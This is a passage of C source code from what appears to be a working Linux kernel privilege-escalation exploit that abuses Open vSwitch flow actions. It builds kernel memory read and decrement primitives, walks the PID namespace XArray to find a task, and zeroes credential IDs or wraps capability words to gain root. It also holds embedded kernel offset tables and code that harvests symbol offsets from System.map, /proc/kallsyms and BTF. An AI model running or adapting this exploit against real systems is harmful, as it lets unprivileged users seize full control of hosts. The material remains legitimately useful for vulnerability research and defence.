        }
    }
done:
    free(dumped);
    return result;
}

static int read_u8(reader_t *r, uint64_t address)
{
    for (int i = 0; i < r->lane_count; i++) {
        int v = read_u8_with_lane(r, address, &r->lanes[i]);
        if (v >= 0)
            return v;
        if (v == -2) {
            fprintf(stderr, "hard failure reading byte at 0x%016llx\n",
                    (unsigned long long)address);
            exit(1);
        }
    }
    fprintf(stderr, "fixed tunnel carriers could not read byte at 0x%016llx\n",
            (unsigned long long)address);
    exit(1);
}

static void read_bytes(reader_t *r, uint64_t address, uint8_t *out, size_t n)
{
    for (size_t i = 0; i < n; i++)
        out[i] = (uint8_t)read_u8(r, address + i);
}

static uint32_t read_u32(reader_t *r, uint64_t address)
{
    uint8_t b[4];
    read_bytes(r, address, b, 4);
    return (uint32_t)(b[0] | ((uint32_t)b[1] << 8) | ((uint32_t)b[2] << 16) |
                      ((uint32_t)b[3] << 24));
}

static uint64_t read_u64(reader_t *r, uint64_t address)
{
    uint8_t b[8];
    read_bytes(r, address, b, 8);
    uint64_t v = 0;
    for (int i = 7; i >= 0; i--)
        v = (v << 8) | b[i];
    return v;
}

/* ------------------------------------------------------------- write prim */
static void decrement_u32_once(writer_t *w, uint64_t target)
{
    uint64_t tun_dst = target - (uint64_t)w->offsets->dst_entry_ref;
    int carriers[2];
    int nc = carrier_names(&w->carriers, carriers);
    for (int i = 0; i < nc; i++) {
        int carrier = carriers[i];
        w->seq++;
        size_t klen;
        uint8_t *key = flow_key(w->seq, &klen);
        size_t alen;
        uint8_t *actions =
            clone_with_fake_set_carrier(carrier, tun_dst, w->offsets, &alen);

        int rc = ovs_create_flow(w->flow_family, w->dp_ifindex, key, klen,
                                 actions, alen);
        if (rc == -ENOMEM) {
            fprintf(stderr, "Ran out of memory; reattempt the PoC after a "
                            "reboot or with more RAM (recommended 2GB+).\n");
            exit(1);
        }
        if (rc < 0) {
            if (carrier_error(rc)) {
                if (retry_after(&w->carriers, carrier, i + 1 < nc)) {
                    free(key);
                    free(actions);
                    continue;
                }
                fprintf(stderr, "fake SET %d write carrier failed\n", carrier);
                free(key);
                free(actions);
                exit(1);
            }
            fprintf(stderr, "create flow failed: errno=%d %s\n", -rc,
                    strerror(-rc));
            free(key);
            free(actions);
            exit(1);
        }
        rc = ovs_delete_flow(w->flow_family, w->dp_ifindex, key, klen);
        free(key);
        free(actions);
        if (rc < 0) {
            fprintf(stderr, "delete flow failed: errno=%d %s\n", -rc,
                    strerror(-rc));
            exit(1);
        }
        return;
    }
    fprintf(stderr, "write carriers exhausted\n");
    exit(1);
}

/* -------------------------------------------------------------- kernel km */
static uint64_t canonicalize_kernel_pointer(uint64_t v)
{
    if (v >= 0xFFFF800000000000ULL)
        return v;
    if (v >= 0x0000008000000000ULL && v <= 0x000000FFFFFFFFFFULL)
        return v | 0xFFFFFF0000000000ULL;
    if (v >= 0x0000800000000000ULL && v <= 0x0000FFFFFFFFFFFFULL)
        return v | 0xFFFF000000000000ULL;
    if (v >= 0x0080000000000000ULL && v <= 0x00FFFFFFFFFFFFFFULL)
        return v | 0xFF00000000000000ULL;
    return v;
}

static bool canonical_kernel_pointer(uint64_t v)
{
    uint64_t c = canonicalize_kernel_pointer(v);
    return c >= 0xFF00000000000000ULL && c <= 0xFFFFFFFFFFFFFFFFULL &&
           (c % 8) == 0;
}

static uint64_t read_kernel_pointer(reader_t *r, uint64_t address,
                                    const char *label)
{
    uint64_t p = canonicalize_kernel_pointer(read_u64(r, address));
    if (!canonical_kernel_pointer(p)) {
        fprintf(stderr, "%s at 0x%016llx is not a canonical kernel pointer: "
                        "0x%016llx\n", label, (unsigned long long)address,
                (unsigned long long)p);
        exit(1);
    }
    return p;
}

static bool valid_vmlinux_base(uint64_t value)
{
    return value >= 0xFFFFFFFF80000000ULL &&
           value <= 0xFFFFFFFFF0000000ULL && (value % 0x200000ULL) == 0;
}

static int64_t derive_helper_module_ktype(reader_t *r,
                                          uint64_t helper_me_address,
                                          uint64_t helper_pointer,
                                          const struct offsets *offsets)
{
    uint64_t module_pointer =
        canonicalize_kernel_pointer(read_u64(r, helper_me_address));
    if (!canonical_kernel_pointer(module_pointer) ||
        module_pointer < helper_pointer - 0x800000ULL ||
        module_pointer > helper_pointer + 0x800000ULL) {
        fprintf(stderr, "helper->me did not read as a nearby canonical module "
                        "pointer: helper=0x%016llx me=0x%016llx\n",
                (unsigned long long)helper_pointer,
                (unsigned long long)module_pointer);
        exit(1);
    }
    uint64_t ktype_addr = module_pointer + (uint64_t)offsets->module_kobj_ktype;
    uint64_t module_ktype =
        canonicalize_kernel_pointer(read_u64(r, ktype_addr));
    if (!valid_vmlinux_base(module_ktype - (uint64_t)offsets->vmlinux_module_ktype)) {
        fprintf(stderr, "module.kobj.ktype at 0x%016llx read 0x%016llx, which "
                        "does not match the expected vmlinux symbol offset\n",
                (unsigned long long)ktype_addr,
                (unsigned long long)module_ktype);
        exit(1);
    }
    printf("helper->me module pointer 0x%016llx validated directly\n",
           (unsigned long long)module_pointer);
    return (int64_t)module_ktype;
}

/* ---------------------------------------------------------------- xarray */
static int64_t xarray_entry_to_node(uint64_t entry, uint64_t *node_out)
{
    if (entry == 0 || (entry & 0x3) != 0x2)
        return -1;
    uint64_t node = canonicalize_kernel_pointer(entry & ~0x3ULL);
    if (canonical_kernel_pointer(node)) {
        *node_out = node;
        return 0;
    }
    return -1;
}

static int64_t xarray_entry_to_pointer(uint64_t entry, uint64_t *ptr_out)
{
    if (entry == 0 || (entry & 0x3) != 0)
        return -1;
    uint64_t ptr = canonicalize_kernel_pointer(entry);
    if (canonical_kernel_pointer(ptr)) {
        *ptr_out = ptr;
        return 0;
    }
    return -1;
}

static uint64_t read_xarray_entry(reader_t *r, uint64_t address,
                                  const char *label)
{
    uint64_t value = read_u64(r, address);
    uint64_t node;
    if (xarray_entry_to_node(value, &node) == 0)
        return node | 0x2;
    uint64_t ptr;
    if (xarray_entry_to_pointer(value, &ptr) == 0)
        return ptr;
    fprintf(stderr, "%s at 0x%016llx is not a valid XArray entry: 0x%016llx\n",
            label, (unsigned long long)address, (unsigned long long)value);
    exit(1);
}

static int read_xa_shift(reader_t *r, uint64_t address)
{
    int value = read_u8(r, address);
    if (value > 60 || value % 6 != 0) {
        fprintf(stderr, "XArray node shift at 0x%016llx is invalid: %d\n",
                (unsigned long long)address, value);
        exit(1);
    }
    return value;
}

static uint64_t lookup_init_pid_ns_pid(reader_t *r,
                                       const struct offsets *offsets,
                                       uint64_t kernel_base, int pid_nr)
{
    uint64_t idr_addr = kernel_base + (uint64_t)offsets->vmlinux_init_pid_ns +
                        (uint64_t)offsets->pid_namespace_idr;
    uint32_t idr_base = read_u32(r, idr_addr + (uint64_t)offsets->idr_base);
    if ((uint32_t)pid_nr < idr_base) {
        fprintf(stderr, "pid %d is below init pid namespace idr_base %u\n",
                pid_nr, idr_base);
        exit(1);
    }
    uint32_t index = (uint32_t)pid_nr - idr_base;
    uint64_t xarray_addr = idr_addr + (uint64_t)offsets->idr_idr_rt;

    uint64_t entry = read_xarray_entry(
        r, xarray_addr + (uint64_t)offsets->xarray_xa_head,
        "init_pid_ns.idr.xa_head");
    for (int depth = 0; depth < 8; depth++) {
        uint64_t node;
        if (xarray_entry_to_node(entry, &node) == 0) {
            int shift = read_xa_shift(r, node + (uint64_t)offsets->xa_node_shift);
            int slot = (int)((index >> shift) & 0x3F);
            char label[64];
            snprintf(label, sizeof(label), "init_pid_ns.idr.slot[%d]", slot);
            entry = read_xarray_entry(
                r, node + (uint64_t)offsets->xa_node_slots + (uint64_t)slot * 8,
                label);
            continue;
        }
        uint64_t ptr;
        if (xarray_entry_to_pointer(entry, &ptr) == 0)
            return ptr;
    }
    fprintf(stderr, "init_pid_ns idr traversal exceeded depth limit for pid "
                    "%d\n", pid_nr);
    exit(1);
}

static uint64_t locate_task_by_init_pid_ns(reader_t *r,
                                           const struct offsets *offsets,
                                           uint64_t kernel_base, int wanted_pid)
{
    uint64_t pid_struct =
        lookup_init_pid_ns_pid(r, offsets, kernel_base, wanted_pid);
    uint64_t first = read_kernel_pointer(
        r, pid_struct + (uint64_t)offsets->pid_tasks +
               (uint64_t)offsets->hlist_head_first,
        "pid.tasks.first");
    uint64_t task = first - (uint64_t)offsets->task_pid_links;
    if (!canonical_kernel_pointer(task)) {
        fprintf(stderr, "init_pid_ns idr produced noncanonical task from "
                        "hlist: pid_struct=0x%016llx hlist=0x%016llx\n",
                (unsigned long long)pid_struct, (unsigned long long)first);
        exit(1);
    }
    uint32_t pid = read_u32(r, task + (uint64_t)offsets->task_pid);
    if ((int)pid != wanted_pid) {
        fprintf(stderr, "init_pid_ns idr resolved pid_struct=0x%016llx "
                        "task=0x%016llx, but task.pid=%u, expected %d\n",
                (unsigned long long)pid_struct, (unsigned long long)task, pid,
                wanted_pid);
        exit(1);
    }
    printf("located task through init_pid_ns idr: pid_struct=0x%016llx "
           "task=0x%016llx\n", (unsigned long long)pid_struct,
           (unsigned long long)task);
    return task;
}

/* ------------------------------------------------------------ credential */
static void decrement_to_zero(reader_t *r, writer_t *w, uint64_t address,
                              const char *label)
{
    uint32_t value = read_u32(r, address);
    printf("%s before=%u\n", label, value);
    fflush(stdout);
    if (value > 100000) {
        fprintf(stderr, "%s value %u is unexpectedly large\n", label, value);
        exit(1);
    }
    for (uint32_t idx = 0; idx < value; idx++) {
        decrement_u32_once(w, address);
        if (idx && idx % 250 == 0)
            printf("%s: queued %u/%u decrements\n", label, idx, value);
    }
    sleep(2);
    uint32_t now = read_u32(r, address);
    if (now != 0) {
        fprintf(stderr, "%s did not reach zero; current value is %u\n", label,
                now);
        exit(1);
    }
    printf("%s after=0\n", label);
    fflush(stdout);
}

static void decrement_zero_to_all_ones(reader_t *r, writer_t *w,
                                       uint64_t address, const char *label)
{
    uint32_t value = read_u32(r, address);
    printf("%s before=0x%08x\n", label, value);
    fflush(stdout);
    if (value != 0) {
        fprintf(stderr, "%s expected to start at zero for legacy __refcnt "
                        "conversion, got 0x%08x\n", label, value);
        exit(1);
    }
    decrement_u32_once(w, address);
    usleep(500000);
    uint32_t now = read_u32(r, address);
    if (now != 0xFFFFFFFF) {
        fprintf(stderr, "%s did not wrap to 0xffffffff; current value is "
                        "0x%08x\n", label, now);
        exit(1);
    }
    printf("%s after=0xffffffff\n", label);
    fflush(stdout);
}

static bool panic_on_warn_enabled(void)
{
    FILE *f = fopen("/proc/sys/kernel/panic_on_warn", "r");
    if (!f)
        return false;
    char buf[16] = { 0 };
    size_t n = fread(buf, 1, sizeof(buf) - 1, f);
    fclose(f);
    buf[n] = 0;
    char *p = buf;
    while (*p == ' ' || *p == '\t')
        p++;
    return !(strcmp(p, "") == 0 || strcmp(p, "0") == 0);
}

static void convert_writer_credential(reader_t *r, writer_t *w,
                                      const struct offsets *offsets,
                                      uint64_t cred)
{
    if (strcmp(offsets->dst_entry_ref_kind, "__rcuref") == 0) {
        step("DECREMENTING FSUID/FSGID");
        decrement_to_zero(r, w, cred + (uint64_t)offsets->cred_fsuid, "fsuid");
        decrement_to_zero(r, w, cred + (uint64_t)offsets->cred_fsgid, "fsgid");
        return;
    }
    if (strcmp(offsets->dst_entry_ref_kind, "__refcnt") == 0) {
        if (panic_on_warn_enabled()) {
            fprintf(stderr, "legacy dst_entry.__refcnt conversion would "
                            "trigger a kernel WARN while wrapping capability "
                            "words, and panic_on_warn is enabled\n");
            exit(1);
        }
        printf("legacy dst_entry.__refcnt conversion: panic_on_warn is "
               "disabled; wrapping capability words may emit one nonfatal "
               "dst_release warning\n");
        step("WRAPPING HOST WRITER CAPABILITIES");
        decrement_zero_to_all_ones(r, w,
                                   cred + (uint64_t)offsets->cred_cap_permitted,
                                   "cap_permitted.low");
        decrement_zero_to_all_ones(r, w,
                                   cred + (uint64_t)offsets->cred_cap_effective,
                                   "cap_effective.low");
        return;
    }
    fprintf(stderr, "unsupported dst_entry ref kind %s\n",
            offsets->dst_entry_ref_kind);
    exit(1);
}

/* ------------------------------------------------------- reader/writer init */
static void reader_init(reader_t *r, const struct offsets *o, int flow_family,
                        int dp_ifindex, int carrier_mode,
                        const char *const *preferred, int npref)
{
    r->offsets = o;
    r->flow_family = flow_family;
    r->dp_ifindex = dp_ifindex;
    r->seq = 1000;
    r->carriers.mode = carrier_mode;
    r->carriers.timeout_disabled = false;
    r->carriers.label = "read";

    lane_t def[14];
    int n = 0;
    def[n++] = (lane_t){ "tos", o->ip_tunnel_key_tos,
                         OVS_TUNNEL_KEY_ATTR_TOS, 0, true };
    def[n++] = (lane_t){ "ttl", o->ip_tunnel_key_ttl,
                         OVS_TUNNEL_KEY_ATTR_TTL, 0, false };
    def[n++] = (lane_t){ "tp_src_0", o->ip_tunnel_key_tp_src,
                         OVS_TUNNEL_KEY_ATTR_TP_SRC, 0, true };
    def[n++] = (lane_t){ "tp_src_1", o->ip_tunnel_key_tp_src + 1,
                         OVS_TUNNEL_KEY_ATTR_TP_SRC, 1, true };
    def[n++] = (lane_t){ "tp_dst_0", o->ip_tunnel_key_tp_dst,
                         OVS_TUNNEL_KEY_ATTR_TP_DST, 0, true };
    def[n++] = (lane_t){ "tp_dst_1", o->ip_tunnel_key_tp_dst + 1,
                         OVS_TUNNEL_KEY_ATTR_TP_DST, 1, true };
    for (int i = 0; i < 4; i++) {
        lane_t l;
        snprintf(l.name, sizeof(l.name), "ipv4_src_%d", i);
        l.field_offset = o->ip_tunnel_key_ipv4_src + i;
        l.attr_type = OVS_TUNNEL_KEY_ATTR_IPV4_SRC;
        l.payload_index = i;
        l.optional_zero = true;
        def[n++] = l;
    }
    for (int i = 0; i < 4; i++) {
        lane_t l;
        snprintf(l.name, sizeof(l.name), "ipv4_dst_%d", i);
        l.field_offset = o->ip_tunnel_key_ipv4_dst + i;
        l.attr_type = OVS_TUNNEL_KEY_ATTR_IPV4_DST;
        l.payload_index = i;
        l.optional_zero = true;
        def[n++] = l;
    }
    int cnt = 0;
    for (int p = 0; p < npref; p++)
        for (int i = 0; i < n; i++)
            if (strcmp(def[i].name, preferred[p]) == 0)
                r->lanes[cnt++] = def[i];
    for (int i = 0; i < n; i++) {
        bool in = false;
        for (int p = 0; p < npref; p++)
            if (strcmp(def[i].name, preferred[p]) == 0) {
                in = true;
                break;
            }
        if (!in)
            r->lanes[cnt++] = def[i];
    }
    r->lane_count = cnt;
}

static void writer_init(writer_t *w, const struct offsets *o, int flow_family,
                        int dp_ifindex, int carrier_mode)
{
    w->offsets = o;
    w->flow_family = flow_family;
    w->dp_ifindex = dp_ifindex;
    w->seq = 100000000;
    w->carriers.mode = carrier_mode;
    w->carriers.timeout_disabled = false;
    w->carriers.label = "write";
}

static int carrier_str_to_mode(const char *s)
{
    if (strcmp(s, "timeout") == 0)
        return CARRIER_TIMEOUT;
    if (strcmp(s, "labels-only") == 0)
        return CARRIER_LABELS_ONLY;
    return CARRIER_AUTO;
}

/* ------------------------------------------------------------- records */
static struct kernel_build_record *records = NULL;
static int records_count = 0;

static uint32_t rd_u32(const uint8_t *p)
{
    return (uint32_t)p[0] | ((uint32_t)p[1] << 8) | ((uint32_t)p[2] << 16) |
           ((uint32_t)p[3] << 24);
}

static uint64_t rd_u64(const uint8_t *p)
{
    uint64_t v = 0;
    for (int i = 7; i >= 0; i--)
        v = (v << 8) | p[i];
    return v;
}

static const char *pool_at(uint32_t off)
{
    return (const char *)(records_blob + 4 + off);
}

static void load_records(void)
{
    uint32_t pool_len = rd_u32(records_blob);
    if (pool_len != RECORDS_POOL_LEN) {
        fprintf(stderr, "records blob pool length mismatch\n");
        exit(1);
    }
    const uint8_t *descs = records_blob + 4 + pool_len;
    size_t blob_total = sizeof(records_blob);
    size_t desc_bytes = blob_total - 4 - pool_len;
    records_count = (int)(desc_bytes / RECORD_DESC_SIZE);
    records = calloc((size_t)records_count, sizeof(*records));
    if (!records) {
        fprintf(stderr, "out of memory\n");
        exit(1);
    }
    for (int i = 0; i < records_count; i++) {
        struct kernel_build_record *rec = &records[i];
        const uint8_t *d = descs + (size_t)i * RECORD_DESC_SIZE;
        rec->release = pool_at(rd_u32(d + 0));
        rec->version = pool_at(rd_u32(d + 4));
        rec->machine = pool_at(rd_u32(d + 8));
        rec->read_carrier = pool_at(rd_u32(d + 12));
        rec->write_carrier = pool_at(rd_u32(d + 16));
        rec->offsets.dst_entry_ref_kind =
            rd_u32(d + 20) ? "__refcnt" : "__rcuref";

#define LD(q, name) (rec->offsets.name = (int64_t)rd_u64((q)))
        const uint8_t *q = d + 24;
        LD(q + 0 * 8, nf_conntrack_helper_me);
        LD(q + 1 * 8, module_kobj_ktype);
        LD(q + 2 * 8, vmlinux_module_ktype);
        LD(q + 3 * 8, vmlinux_init_pid_ns);
        LD(q + 4 * 8, task_pid);
        LD(q + 5 * 8, task_cred);
        LD(q + 6 * 8, task_pid_links);
        LD(q + 7 * 8, cred_fsuid);
        LD(q + 8 * 8, cred_fsgid);
        LD(q + 9 * 8, cred_cap_permitted);
        LD(q + 10 * 8, cred_cap_effective);
        LD(q + 11 * 8, pid_namespace_idr);
        LD(q + 12 * 8, idr_idr_rt);
        LD(q + 13 * 8, idr_base);
        LD(q + 14 * 8, xarray_xa_head);
        LD(q + 15 * 8, xa_node_shift);
        LD(q + 16 * 8, xa_node_slots);
        LD(q + 17 * 8, pid_tasks);
        LD(q + 18 * 8, hlist_head_first);
        LD(q + 19 * 8, dst_entry_ref);
        LD(q + 20 * 8, metadata_dst_tun_info);
        LD(q + 21 * 8, ip_tunnel_key_ipv4_src);
        LD(q + 22 * 8, ip_tunnel_key_ipv4_dst);
        LD(q + 23 * 8, ip_tunnel_key_tos);
        LD(q + 24 * 8, ip_tunnel_key_ttl);
        LD(q + 25 * 8, ip_tunnel_key_tp_src);
        LD(q + 26 * 8, ip_tunnel_key_tp_dst);
        LD(q + 27 * 8, ovs_ct_labels);
        LD(q + 28 * 8, ovs_ct_action_len);
#undef LD

        rec->ovs_key_attr_tunnel_info =
            (int)rd_u32(d + 24 + 29 * 8);
        uint32_t lcount = rd_u32(d + 24 + 29 * 8 + 4);
        uint32_t loff = rd_u32(d + 24 + 29 * 8 + 8);
        rec->read_lanes_count = (int)lcount;
        rec->read_lanes = malloc((size_t)lcount * sizeof(char *));
        if (!rec->read_lanes) {
            fprintf(stderr, "out of memory\n");
            exit(1);
        }
        const char *lp = pool_at(loff);
        for (int l = 0; l < (int)lcount; l++) {
            rec->read_lanes[l] = lp;
            lp += strlen(lp) + 1;
        }
    }
}

static struct kernel_build_record *lookup_kernel_build_record(void)
{
    struct utsname u;
    uname(&u);
    struct kernel_build_record *release_match = NULL;
    for (int i = 0; i < records_count; i++) {
        if (strcmp(records[i].release, u.release) == 0) {
            if (strcmp(records[i].version, u.version) == 0 &&
                strcmp(records[i].machine, u.machine) == 0) {
                printf("kernel lookup: using pre-derived record for "
                       "release=%s version=%s\n", records[i].release,
                       records[i].version);
                return &records[i];
            }
            release_match = &records[i];
        }
    }
    if (release_match) {
        printf("kernel lookup: release is covered but this exact build is "
               "not: release=%s version=%s machine=%s\n", u.release, u.version,
               u.machine);
        return NULL;
    }
    printf("kernel lookup: no pre-derived record for release=%s version=%s "
           "machine=%s; will try local System.map/kallsyms and BTF "
           "derivation\n", u.release, u.version, u.machine);
    return NULL;
}

static void derive_ovs_uapi_constants_record(struct kernel_build_record *rec)
{
    OVS_KEY_ATTR_TUNNEL_INFO = rec->ovs_key_attr_tunnel_info;
    printf("UAPI: using pre-derived OVS_KEY_ATTR_TUNNEL_INFO=%d\n",
           OVS_KEY_ATTR_TUNNEL_INFO);
}

/* -------------------------------------------------------- dynamic derive */
static char *run_capture(const char *cmd)
{
    FILE *f = popen(cmd, "r");
    if (!f)
        return NULL;
    size_t cap = 8192, len = 0;
    char *out = malloc(cap);
    if (!out) {
        pclose(f);
        return NULL;
    }
    size_t n;
    while ((n = fread(out + len, 1, cap - len - 1, f)) > 0) {
        len += n;
        if (len + 1 >= cap) {
            cap *= 2;
            out = realloc(out, cap);
            if (!out) {
                pclose(f);
                return NULL;
            }
        }
    }
    out[len] = 0;
    pclose(f);
    return out;
}

static bool binary_in_path(const char *name)
{
    const char *path = getenv("PATH");
    if (!path)
        path = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin";
    char *copy = strdup(path);
    if (!copy)
        return false;
    char *save = NULL;
    bool found = false;
    for (char *tok = strtok_r(copy, ":", &save); tok;
         tok = strtok_r(NULL, ":", &save)) {
        if (!tok[0])
            tok = ".";
        char p[512];
        snprintf(p, sizeof(p), "%s/%s", tok, name);
        if (access(p, X_OK) == 0) {
            found = true;
            break;
        }
    }
    free(copy);
    return found;
}

static int symbol_offsets_from(const char *path, long *module_ktype,
                               long *init_pid_ns)
{
    printf("symbols: trying %s\n", path);
    fflush(stdout);
    FILE *f = fopen(path, "r");
    if (!f) {
        printf("symbols: %s unavailable to this user: %s\n", path,
               strerror(errno));
        return -1;
    }
    uint64_t base = 0, mk = 0, ipns = 0;
    bool have_base = false, have_mk = false, have_ipns = false;
    char line[1024];
    while (fgets(line, sizeof(line), f)) {
        char sym[256];
        unsigned long long addr;
        char type;
        if (sscanf(line, "%llx %c %255s", &addr, &type, sym) == 3) {
            if (strcmp(sym, "_text") == 0) {
                base = addr;
                have_base = true;
            } else if (strcmp(sym, "module_ktype") == 0) {
                mk = addr;
                have_mk = true;
            } else if (strcmp(sym, "init_pid_ns") == 0) {
                ipns = addr;
                have_ipns = true;
            }
        }
    }
    fclose(f);
    if (!have_base || !have_mk || !have_ipns) {
        printf("symbols: %s readable but missing required symbols\n", path);
        return -1;
    }
    if (base == 0 || mk == 0 || ipns == 0) {
        printf("symbols: %s readable but zeroed required symbols\n", path);
        return -1;
    }
    long mko = (long)(mk - base);
    long io = (long)(ipns - base);
    if (mko <= 0 || io <= 0) {
        printf("symbols: %s readable but produced invalid symbol offsets\n",
               path);
        return -1;
    }
    printf("symbols: using %s; module_ktype_offset=0x%lx "
           "init_pid_ns_offset=0x%lx\n", path, mko, io);
    fflush(stdout);
    *module_ktype = mko;
    *init_pid_ns = io;
    return 0;
}

static void derive_symbol_offsets(long *module_ktype, long *init_pid_ns)
{
    struct utsname u;
    uname(&u);
    char paths[16][512];
    int np = 0;
    snprintf(paths[np++], 512, "/boot/System.map-%s", u.release);
    snprintf(paths[np++], 512, "/boot/System.map");
    snprintf(paths[np++], 512, "/proc/kallsyms");
    snprintf(paths[np++], 512, "/usr/lib/debug/boot/System.map-%s", u.release);
    snprintf(paths[np++], 512, "/lib/modules/%s/build/System.map", u.release);
    snprintf(paths[np++], 512, "/usr/src/linux-%s/System.map", u.release);
    snprintf(paths[np++], 512, "/usr/src/kernels/%s/System.map", u.release);

    FILE *kr = fopen("/usr/src/linux/include/config/kernel.release", "r");
    if (kr) {
        char rel[256] = { 0 };
        size_t n = fread(rel, 1, sizeof(rel) - 1, kr);
        fclose(kr);
        while (n && (rel[n - 1] == '\n' || rel[n - 1] == '\r'))
            rel[--n] = 0;
        if (strcmp(rel, u.release) == 0)
            snprintf(paths[np++], 512, "/usr/src/linux/System.map");
    }

    int seen[16] = { 0 };
    for (int i = 0; i < np; i++) {
        bool dup = false;
        for (int j = 0; j < i; j++)
            if (seen[j] && strcmp(paths[j], paths[i]) == 0) {
                dup = true;
                break;
            }
        if (dup)
            continue;
        seen[i] = 1;
        if (symbol_offsets_from(paths[i], module_ktype, init_pid_ns) == 0)
            return;
    }
    fprintf(stderr, "kernel is not covered by embedded records, and this user "
                    "could not derive module_ktype/init_pid_ns from local "
                    "System.map or nonzero /proc/kallsyms locations.\n");
    exit(1);
}

static char *strip_c_comments(const char *text)
{
    size_t n = strlen(text);
    char *out = malloc(n + 1);
    if (!out) {
        fprintf(stderr, "out of memory\n");
        exit(1);
    }
    size_t o = 0;
    const char *p = text;
    while (*p) {
        if (p[0] == '/' && p[1] == '*') {
            const char *e = strstr(p + 2, "*/");
            if (!e)
                break;
            p = e + 2;
        } else if (p[0] == '/' && p[1] == '/') {
            while (*p && *p != '\n')
                p++;
        } else {
            out[o++] = *p;
            p++;
        }
    }
    out[o] = 0;
    return out;
}

static bool valid_int_str(const char *s)
{
    if (!s || !*s)
        return false;
    if (strncmp(s, "0x", 2) == 0 || strncmp(s, "0X", 2) == 0) {
        s += 2;
        if (!*s)
            return false;
        while (*s && isxdigit((unsigned char)*s))
            s++;
        return *s == 0;
    }
    if (*s < '0' || *s > '9')
        return false;
    while (*s && isdigit((unsigned char)*s))
        s++;
    return *s == 0;
}

static int parse_enum_from_text(const char *text, const char *enum_name,
                                const char *constant)
{
    char *clean = strip_c_comments(text);
    char needle[256];
    snprintf(needle, sizeof(needle), "enum %s {", enum_name);
    const char *s = strstr(clean, needle);
    if (!s) {
        free(clean);
        return -1;
    }
    s += strlen(needle);
    const char *e = strstr(s, "};");
    if (!e) {
        free(clean);
        return -1;
    }
    long value = 0;
    const char *p = s;
    while (p < e) {
        while (p < e && (*p == ' ' || *p == '\t' || *p == '\n' || *p == '\r'))
            p++;
        if (p >= e)
            break;
        const char *comma = strchr(p, ',');
        const char *end = (comma && comma < e) ? comma : e;
        char namebuf[128] = { 0 };
        long nv = 0;
        const char *nstart = p;
        while (nstart < end && (*nstart == ' ' || *nstart == '\t'))
            nstart++;
        const char *nend = nstart;
        while (nend < end && *nend != ' ' && *nend != '\t' && *nend != '=')
            nend++;
        size_t nl = (size_t)(nend - nstart);
        if (nl >= sizeof(namebuf))
            nl = sizeof(namebuf) - 1;
        memcpy(namebuf, nstart, nl);
        namebuf[nl] = 0;
        int explicit = 0;
        const char *eq = memchr(p, '=', (size_t)(end - p));
        if (eq) {
            const char *v = eq + 1;
            while (v < end && (*v == ' ' || *v == '\t'))
                v++;
            char vbuf[64] = { 0 };
            size_t vl = (size_t)(end - v);
            if (vl >= sizeof(vbuf))
                vl = sizeof(vbuf) - 1;
            memcpy(vbuf, v, vl);
            vbuf[vl] = 0;
            if (!valid_int_str(vbuf)) {
                free(clean);
                return -1;
            }
            nv = strtol(vbuf, NULL, 0);
            explicit = 1;
        }
        if (explicit)
            value = nv;
        if (strcmp(namebuf, constant) == 0) {
            free(clean);
            return (int)value;
        }
        value++;
        p = (end == e) ? e : end + 1;
    }
    free(clean);
    return -1;
}

static int parse_btf_enum_value(const char *btf_path, const char *enum_name,
                                const char *constant)
{
    if (access(btf_path, R_OK) != 0)
        return -1;
    char cmd[1024];
    snprintf(cmd, sizeof(cmd), "pahole -C %s %s 2>&1", enum_name, btf_path);
    char *out = run_capture(cmd);
    if (out) {
        int v = parse_enum_from_text(out, enum_name, constant);
        free(out);
        if (v >= 0)
            return v;
    }
    const char *bn = strrchr(btf_path, '/');
    bn = bn ? bn + 1 : btf_path;
    if (strcmp(bn, "vmlinux") != 0 && access("/sys/kernel/btf/vmlinux", R_OK) == 0) {
        snprintf(cmd, sizeof(cmd),
                 "pahole --btf_base=/sys/kernel/btf/vmlinux -C %s %s 2>&1",
                 enum_name, btf_path);
        out = run_capture(cmd);
        if (out) {
            int v = parse_enum_from_text(out, enum_name, constant);
            free(out);
            if (v >= 0)
                return v;
        }
    }
    return -1;
}

static void derive_ovs_uapi_constants_dynamic(void)
{
    const char *btf_path = "/sys/kernel/btf/openvswitch";
    int tunnel_info = parse_btf_enum_value(btf_path, "ovs_key_attr",
                                           "OVS_KEY_ATTR_TUNNEL_INFO");
    if (tunnel_info < 0) {
        fprintf(stderr, "kernel is not covered by pre-derived records, and "
                        "this user could not derive OVS_KEY_ATTR_TUNNEL_INFO "
                        "from %s\n", btf_path);
        exit(1);
    }
    if (tunnel_info != 31)
        printf("UAPI: OVS_KEY_ATTR_TUNNEL_INFO=%d from %s (fallback was 31)\n",
               tunnel_info, btf_path);
    OVS_KEY_ATTR_TUNNEL_INFO = tunnel_info;
}

static char **btf_readable = NULL;
static int btf_readable_count = 0;

static void btf_add_path(char ***arr, int *cnt, int *cap, const char *path)
{
    for (int i = 0; i < *cnt; i++)
        if (strcmp((*arr)[i], path) == 0)
            return;
    if (*cnt == *cap) {
        *cap = *cap ? *cap * 2 : 32;
        *arr = realloc(*arr, (size_t)(*cap) * sizeof(char *));
        if (!*arr) {
            fprintf(stderr, "out of memory\n");
            exit(1);
        }
    }
    (*arr)[*cnt] = strdup(path);
    (*cnt)++;
}

static void btf_init(void)
{
    char **paths = NULL;
    int cnt = 0, cap = 0;
    struct utsname u;
    uname(&u);

    btf_add_path(&paths, &cnt, &cap, "/sys/kernel/btf/vmlinux");
    DIR *d = opendir("/sys/kernel/btf");
    if (d) {
        struct dirent *de;
        while ((de = readdir(d)) != NULL) {
            if (strcmp(de->d_name, ".") == 0 || strcmp(de->d_name, "..") == 0 ||
                strcmp(de->d_name, "vmlinux") == 0)
                continue;
            char p[512];
            snprintf(p, sizeof(p), "/sys/kernel/btf/%s", de->d_name);
            btf_add_path(&paths, &cnt, &cap, p);
        }
        closedir(d);
    }
    const char *builds[] = {
        "/lib/modules/%s/build/net/openvswitch/conntrack.o",
        "/lib/modules/%s/build/net/openvswitch/openvswitch.o",
        "/lib/modules/%s/build/net/netfilter/core.o",
        "/lib/modules/%s/build/net/netfilter/nf_conntrack_core.o",
        "/lib/modules/%s/build/net/netfilter/nf_conntrack.o",
        "/lib/modules/%s/build/net/netfilter/nf_conntrack_ftp.o",
        "/lib/modules/%s/build/vmlinux",
    };
    for (size_t i = 0; i < sizeof(builds) / sizeof(builds[0]); i++) {
        char p[512];
        snprintf(p, sizeof(p), builds[i], u.release);
        btf_add_path(&paths, &cnt, &cap, p);
    }
    char p[512];
    snprintf(p, sizeof(p), "/usr/src/linux-%s/vmlinux", u.release);
    btf_add_path(&paths, &cnt, &cap, p);
